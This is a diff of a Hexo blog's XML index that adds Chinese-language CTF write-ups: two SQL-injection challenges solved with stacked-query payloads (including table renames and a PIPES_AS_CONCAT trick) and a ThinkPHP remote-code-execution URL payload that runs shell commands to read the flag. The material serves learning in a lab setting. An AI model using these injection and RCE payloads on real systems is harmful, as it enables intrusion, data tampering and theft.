@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>BUU每日一题004</title>
+    <link href="/2021/01/18/BUU004/"/>
+    <url>/2021/01/18/BUU004/</url>
+    
+    <content type="html"><![CDATA[<h2 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h2><ul><li>题目：[SUCTF 2019]EasySQL<br><img src="https://ftp.bmp.ovh/imgs/2021/01/756a703b3be17b15.png"><br>又是挨打的一天，哎       </li><li>分析<br>试了几下，发现了四种回显，<br><img src="https://ftp.bmp.ovh/imgs/2021/01/a072e95bbf3c2e3e.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/01/3d393a1fd8f639c1.png"><br>第三种输出<code>Nonono</code>;第四种无输出；看到0和1，本来以为是布尔值注入，但弄了半天也没个结果，还是去看WP吧     </li><li>解<br>原来可以堆叠注入，居然没想到……..<br>然后<code>1;show databases;</code>得到库；<code>1;show tables;</code>得到个Flag表<img src="https://ftp.bmp.ovh/imgs/2021/01/4c78cf42207b044f.png"><br><code>1;select * from Flag;</code>发现得不到flag；看WP说是过滤了flag、from等；而且比赛时源码泄露了？？<br>源码：<code>select $_GET[&#39;query&#39;] || flag from flag</code><br>payload1:<code>*,1</code>     </li></ul><p>payload2:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p><p>得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/a7cdd5bc1578ebf6.png">       </p><ul><li><p>知识点</p><p>  在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。</p><p>  但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>  模式：pipes_as_concat 来实现oracle 的一些功能。</p></li></ul>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Leve1</title>
     <link href="/2021/01/17/leve1/"/>
     <url>/2021/01/17/leve1/</url>
@@ -46,7 +65,7 @@
     <link href="/2021/01/16/BUU002/"/>
     <url>/2021/01/16/BUU002/</url>
     
-    <content type="html"><![CDATA[<h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><ul><li>题目：[强网杯 2019]随便注<br><img src="https://ftp.bmp.ovh/imgs/2021/01/bf336fcfff0a5cd3.png"></li></ul><ul><li>分析：<br>一道sql注入题，而且select、where等一些词被过滤，不能用，对于一个刚刚接触sql注入的小白来说，完全手足无措，看了一些文章，还是一脸懵，还是去看WP吧，就当积累了。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/853a20efda0e5fef.png"></li><li>解<br>可以使用<strong>堆叠注入</strong>，就是一条sql语句以<code>；</code>结尾后，再加sql语句，还是能执行。<br>查看库：<code>1&#39;;show databases;</code>      得到：<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f55691cf3ced64bb.png"><br>查看表：<code>1&#39;;show tables;</code>得到：<br><img src="https://ftp.bmp.ovh/imgs/2021/01/05c3b3fc760f6eca.png"><br>查看表结构：<code>1&#39;;desc `1919810931114514`;</code>值得注意的是，要查询这个表的结构，名字要用反引号包住，否则是不会返回结果的。 </li></ul><p>在windows系统下，反单引号是数据库、表、索引、列和别名用的引用符。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/8e40ff5403047887.png"><br>另一个表：<code>1&#39;;desc words;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/3fbb9965de0a3b46.png"><br>这个表中有<strong>id</strong>和<strong>data</strong>;所以猜测后台的查询语句可能是：<code>select id,data from words where id =</code></p><p>然后这个改名的方法tql：</p><p>将<code>1919810931114514</code>改为words；原来的words改成其他名字words1；列名flag改成id，然后用<code>1&#39; or 1=1;</code>就能得到flag了。<br><strong>payload：</strong></p><pre><code>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2021/01/7bfbf349a5b321ec.png"></p><ul><li>知识点        <blockquote><p>堆叠注入<br>改名字的语句</p></blockquote></li></ul>]]></content>
+    <content type="html"><![CDATA[<h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><ul><li>题目：[强网杯 2019]随便注<br><img src="https://ftp.bmp.ovh/imgs/2021/01/bf336fcfff0a5cd3.png"></li></ul><ul><li>分析：<br>一道sql注入题，而且select、where等一些词被过滤，不能用，对于一个刚刚接触sql注入的小白来说，完全手足无措，看了一些文章，还是一脸懵，还是去看WP吧，就当积累了。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/853a20efda0e5fef.png"></li><li>解<br>可以使用<strong>堆叠注入</strong>，就是一条sql语句以<code>；</code>结尾后，再加sql语句，还是能执行。<br>查看库：<code>1&#39;;show databases;</code>      得到：<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f55691cf3ced64bb.png"><br>查看表：<code>1&#39;;show tables;</code>得到：<br><img src="https://ftp.bmp.ovh/imgs/2021/01/05c3b3fc760f6eca.png"><br>查看表结构：<code>1&#39;;desc `1919810931114514`;</code>值得注意的是，要查询这个表的结构，名字要用反引号包住，否则是不会返回结果的。 </li></ul><p>在windows系统下，反单引号是数据库、表、索引、列和别名用的引用符。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/8e40ff5403047887.png"><br>另一个表：<code>1&#39;;desc words;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/3fbb9965de0a3b46.png"><br>这个表中有<strong>id</strong>和<strong>data</strong>;所以猜测后台的查询语句可能是：<code>select id,data from words where id =</code></p><p>然后这个改名的方法tql：</p><p>将<code>1919810931114514</code>改为words；原来的words改成其他名字words1；列名flag改成id，然后用<code>1&#39; or 1=1;</code>就能得到flag了。<br><strong>payload：</strong></p><pre><code>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2021/01/7bfbf349a5b321ec.png"></p><ul><li>知识点        <blockquote><p>堆叠注入<br>改名字的语句解析：<br>rename命令用于修改表名。<br>rename命令格式：rename table 原表名 to 新表名;<br>修改原字段名称及类<br><code>mysql&gt; ALTER TABLE table_name CHANGE old_field_name new_field_name field_type;</code></p></blockquote></li></ul>]]></content>
     
     
     
@@ -65,9 +84,15 @@
     <link href="/2021/01/15/GFSJ/"/>
     <url>/2021/01/15/GFSJ/</url>
     
-    <content type="html"><![CDATA[]]></content>
+    <content type="html"><![CDATA[<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><ul><li>题目：<img src="https://ftp.bmp.ovh/imgs/2021/01/5118e8d6dae556ff.png">          </li><li>分析<br>摸索了半天，还是没有找到有价值的信息，看了别人的WP后知道原来这是Think PHP的一个远程代码执行漏洞：<blockquote><p> <code>? s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=xxxxx（命令）</code>           </p></blockquote></li></ul><ul><li>解<br>先<code>ls</code>一下，发现没有flag，去上级目录<code>../</code>多加几个，或者直接到根目录<code>./</code>;得到一个flag名字的文件<br><img src="https://ftp.bmp.ovh/imgs/2021/01/362902231b2d1d1d.png"><br><code>cat ../../../flag</code>得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/5e56a7b6934f2903.png"></li></ul>]]></content>
     
     
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
     
   </entry>
   
